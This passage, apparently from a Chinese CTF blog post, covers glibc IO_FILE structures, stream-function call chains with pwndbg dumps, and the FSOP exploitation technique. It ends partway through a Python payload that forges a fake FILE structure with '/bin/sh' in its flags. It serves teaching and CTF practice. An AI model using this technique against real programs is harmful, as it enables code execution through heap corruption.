(&amp;_IO_vtable_check);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<h2 id="io_file结构体">IO_FILE结构体</h2>
<h3 id="io_file_plus"><code>_IO_FILE_plus</code></h3>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="io_wide_data"><code>_IO_wide_data</code></h3>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h3 id="io_wstrn_jumps"><code>_IO_wstrn_jumps</code></h3>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT_DUMMY2,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="io_obstack_jumps"><code>_IO_obstack_jumps</code></h3>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h2 id="io_file结构体的调用">IO_FILE结构体的调用</h2>
<h3 id="初始化">初始化</h3>
<p>初始情况下 <code>_IO_FILE</code> 结构有 * <code>_IO_2_1_stderr_</code>  * <code>_IO_2_1_stdout_</code> * <code>_IO_2_1_stdin_</code>  通过 <code>_IO_list_all</code> 将这三个结构连接，<code>_chain</code>指向下一个结构体 * <code>_IO_list_all-&gt;_IO_2_1_stderr_-&gt;_IO_2_1_stdour_-&gt;_IO_2_1_stdin_</code> 并且存在 3 个全局指针 * <code>stdin</code>指向 <code>_IO_2_1_stdin_</code> * <code>stdout</code>指向<code>_IO_2_1_stdout_</code> * <code>stderr</code>指向<code>_IO_2_1_stderr_</code>  存在函数指针结构体<code>vatble</code>，存放着各种 IO 相关的函数的指针 [[heap-all-in-one/_IO_list_all1.png]] ### fopen  * <code>fopen</code>  * <code>_IO_new_fopen</code>  * <code>__fopen_internal</code>  * <code>malloc</code>创建<code>lock_FILE</code>结构体  * <code>_IO_no_init</code>对结构体进行<code>null</code>初始化  * <code>_IO_file_init</code>将结构体链入<code>_IO_list_all</code>  * <code>_IO_file_open</code>执行系统调用打开文件</p>
<h3 id="fread">fread</h3>
<ul>
<li><code>fread</code></li>
<li><code>_IO_sgetn</code></li>
<li><code>_IO_file_xsgetn</code></li>
<li>若缓冲区没有初始化则调用<code>_IO_doallocbuf-&gt;_IO_file_doallocate</code>初始化IO缓冲区，申请一块堆，只初始化<code>_IO_buf_base、_IO_buf_end</code></li>
<li>若缓冲区有数据未复制到buf，则在buf数据总量不超过所需数据的前提下尽可能多把数据复制到buf中</li>
<li>若缓存区长度小于所需数据长度则重置缓冲区读写指针</li>
<li><code>_underflow</code>调用系统函数<code>_IO_SYSREAD</code>向buf读入数据</li>
</ul>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x1010 (with flag bits: 0x1011)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555a480</span><br><span class="line">Size: 0x1fb80 (with flag bits: 0x1fb81)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x555555559480 <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x55555555a480 <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e044e0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e02030 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; tele 0x5555555592a0</span><br><span class="line">00:0000│ rbx 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">01:0008│     0x5555555592a8 ◂— 0</span><br><span class="line">... ↓        5 skipped</span><br><span class="line">07:0038│     0x5555555592d8 —▸ 0x555555559480 ◂— 0</span><br><span class="line">pwndbg&gt;</span><br><span class="line">08:0040│     0x5555555592e0 —▸ 0x55555555a480 ◂— 0</span><br><span class="line">09:0048│     0x5555555592e8 ◂— 0</span><br><span class="line">... ↓     3 skipped</span><br><span class="line">0d:0068│     0x555555559308 —▸ 0x7ffff7e044e0 (_IO_2_1_stderr_) ◂— 0xfbad2086</span><br><span class="line">0e:0070│     0x555555559310 ◂— 3</span><br><span class="line">0f:0078│     0x555555559318 ◂— 0</span><br><span class="line">pwndbg&gt;</span><br><span class="line">10:0080│     0x555555559320 ◂— 0</span><br><span class="line">11:0088│     0x555555559328 —▸ 0x555555559380 ◂— 1</span><br><span class="line">12:0090│     0x555555559330 ◂— 0xffffffffffffffff</span><br><span class="line">13:0098│     0x555555559338 ◂— 0</span><br><span class="line">14:00a0│     0x555555559340 —▸ 0x555555559390 ◂— 0</span><br><span class="line">15:00a8│     0x555555559348 ◂— 0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">pwndbg&gt;</span><br><span class="line">18:00c0│     0x555555559360 ◂— 0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">1b:00d8│     0x555555559378 —▸ 0x7ffff7e02030 (_IO_file_jumps) ◂— 0</span><br><span class="line">1c:00e0│     0x555555559380 ◂— 1</span><br><span class="line">1d:00e8│     0x555555559388 —▸ 0x7ffff7fb2740 ◂— 0x7ffff7fb2740</span><br><span class="line">1e:00f0│     0x555555559390 ◂— 0</span><br><span class="line">1f:00f8│     0x555555559398 ◂— 0</span><br><span class="line">pwndbg&gt;</span><br><span class="line">20:0100│     0x5555555593a0 ◂— 0</span><br><span class="line">... ↓     7 skipped</span><br><span class="line">pwndbg&gt;</span><br><span class="line">28:0140│     0x5555555593e0 ◂— 0</span><br><span class="line">... ↓     7 skipped</span><br><span class="line">pwndbg&gt;</span><br><span class="line">30:0180│     0x555555559420 ◂— 0</span><br><span class="line">... ↓     7 skipped</span><br><span class="line">pwndbg&gt;</span><br><span class="line">38:01c0│     0x555555559460 ◂— 0</span><br><span class="line">39:01c8│     0x555555559468 ◂— 0</span><br><span class="line">3a:01d0│     0x555555559470 —▸ 0x7ffff7e02228 (_IO_wfile_jumps) ◂— 0</span><br><span class="line">3b:01d8│     0x555555559478 ◂— 0x1011</span><br><span class="line">3c:01e0│ rsi 0x555555559480 ◂— 0</span><br><span class="line">... ↓        3 skipped</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x555555559470</span><br><span class="line">00:0000│         0x555555559470 —▸ 0x7ffff7e02228 (_IO_wfile_jumps) ◂— 0</span><br><span class="line">01:0008│         0x555555559478 ◂— 0x1011</span><br><span class="line">02:0010│ rax rsi 0x555555559480 ◂— <span class="string">&#x27;your_flag_content\n&#x27;</span></span><br><span class="line">03:0018│         0x555555559488 ◂— <span class="string">&#x27;g_content\n&#x27;</span></span><br><span class="line">04:0020│         0x555555559490 ◂— 0xa74 /* <span class="string">&#x27;t\n&#x27;</span> */</span><br><span class="line">05:0028│         0x555555559498 ◂— 0</span><br><span class="line">... ↓            2 skipped</span><br></pre></td></tr></table></figure></div>
<p>[[heap-all-in-one/fread1.png]]</p>
<h3 id="fwrite">fwrite</h3>
<ul>
<li><code>fwrite</code></li>
<li><code>_IO_fwrite</code></li>
<li><code>_IO_file_xsputn</code></li>
<li>若缓冲区有剩余空间，则在不超过缓冲区空闲空间的前提下尽可能多的待输出数据复制到缓冲区</li>
<li>若有数据没有复制到缓冲区中，则调用<code>_IO_new_file_overflow</code>输出并清空输出缓存区数据</li>
<li><code>new_do_while</code>直接输出buf中数据</li>
<li>如果还有剩余数据则调用<code>_IO_default_xsputn</code>复制到输出缓冲区，如果剩余长度大于<code>20</code>字节则使用<code>memcpy</code>否则直接赋值 [[heap-all-in-one/fwrite1.png]]</li>
</ul>
<h3 id="fclose">fclose</h3>
<ul>
<li><code>fopen</code></li>
<li><code>_IO_new_fclose</code></li>
<li><code>_IO_un_link</code></li>
<li><code>_IO_file_close_it</code></li>
</ul>
<h3 id="vtable">vtable</h3>
<h4 id="fopen">fopen</h4>
<p>函数是在分配空间，建立<code>FILE</code>结构体，未调用<code>vtable</code>中的函数</p>
<h4 id="fread-1">fread</h4>
<ul>
<li><code>_IO_sgetn</code>函数调用了<code>_IO_file_xsgetn</code></li>
<li><code>_IO_doallocbuf</code>函数调用了<code>_IO_file_doallocate</code>以初始化输入缓冲区</li>
<li><code>_IO_file_doallocate</code>调用了<code>__GI__IO_file_stat</code>获取文件信息</li>
<li><code>__underflow</code>调用了<code>_IO_new_file_underflow</code>实现文件数据读取</li>
<li><code>_IO_new_file_underflow</code>调用了<code>vtable__GI__IO_file_read</code>最终去执行系统调用<code>read</code></li>
</ul>
<h4 id="fwrite-1">fwrite</h4>
<ul>
<li><code>_IO_fwrite</code>调用了<code>_IO_new_file_xsputn</code></li>
<li><code>_IO_new_file_xsputn</code>调用了<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区</li>
<li><code>_IO_new_file_overflow</code>调用了<code>_IO_file_doallocate</code>以初始化输入缓冲区</li>
<li><code>_IO_file_doallocate</code>调用了<code>vtable</code>中的 <code>__GI__IO_file_stat</code>以获取文件信息</li>
<li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了<code>vtable_IO_new_file_write</code>最终去执行系统调用<code>write</code></li>
</ul>
<h4 id="fclose-1">fclose</h4>
<ul>
<li>在清空缓冲区的<code>_IO_do_write</code>中会调用<code>vtable</code>中的函数</li>
<li>关闭文件描述符<code>_IO_SYSCLOSE</code>为<code>vtable</code>中的 <code>__close</code>函数</li>
<li><code>_IO_FINISH</code>为<code>vtable</code>中的<code>__finish</code></li>
</ul>
<h2 id="fsop">FSOP</h2>
<ul>
<li>核心思想：劫持<code>_IO_list_all</code>指向伪造的<code>_IO_FILE_plus</code>，之后使程序执行<code>_IO_flush_all_lockp</code>函数。该函数会刷新<code>_IO_list_all</code>链表中所有项的文件流，相当于对每个<code>FILE</code>调用<code>fflush</code>，也对应着会调用<code>_IO_FILE_plus.vtable</code>中的<code>_IO_overflow</code></li>
<li>利用前提：
<ul>
<li>程序执行<code>_IO_flush_all_lockp</code>函数有三种情况：
<ul>
<li>当<code>libc</code>执行<code>abort</code>流程时（2.27之后不再刷新）</li>
<li>当执行<code>exit</code>函数时（仅刷新 <code>stderr</code> ，2.36后不再刷新）</li>
<li>当执行流从<code>main</code>函数返回时</li>
</ul></li>
<li>绕过检查</li>
</ul></li>
</ul>
<p><code>abort</code>栈回溯为： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">__GI_abort ()</span><br><span class="line">__libc_message (do_abort=do_abort@entry=<span class="number">0x2</span>, fmt=fmt@entry=<span class="number">0x7ffff7ba0d58</span> <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>)</span><br><span class="line">malloc_printerr (action=<span class="number">0x3</span>, str=<span class="number">0x7ffff7ba0e90</span> <span class="string">&quot;double free or corruption (top)&quot;</span>, ptr=&lt;optimized out&gt;, ar_ptr=&lt;optimized out&gt;)</span><br><span class="line">_int_free (av=<span class="number">0x7ffff7dd4b20</span> &lt;main_arena&gt;, p=&lt;optimized out&gt;,have_lock=<span class="number">0x0</span>)</span><br><span class="line">main ()</span><br><span class="line">__libc_start_main (main=<span class="number">0x400566</span> &lt;main&gt;, argc=<span class="number">0x1</span>, argv=<span class="number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe568</span>)</span><br><span class="line">_start ()</span><br></pre></td></tr></table></figure></div> <code>exit</code>函数，栈回溯为： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br><span class="line">main ()</span><br><span class="line">__libc_start_main (main=<span class="number">0x400566</span> &lt;main&gt;, argc=<span class="number">0x1</span>, argv=<span class="number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe568</span>)</span><br><span class="line">_start ()</span><br></pre></td></tr></table></figure></div> 程序正常退出，栈回溯为： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br><span class="line">__libc_start_main (main=<span class="number">0x400526</span> &lt;main&gt;, argc=<span class="number">0x1</span>, argv=<span class="number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe568</span>)</span><br><span class="line">_start ()</span><br></pre></td></tr></table></figure></div></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW(fp, EOF) == EOF) &#123;</span><br><span class="line">    result = EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span>  <span class="comment"># _flags, an magic number</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file += p64(<span 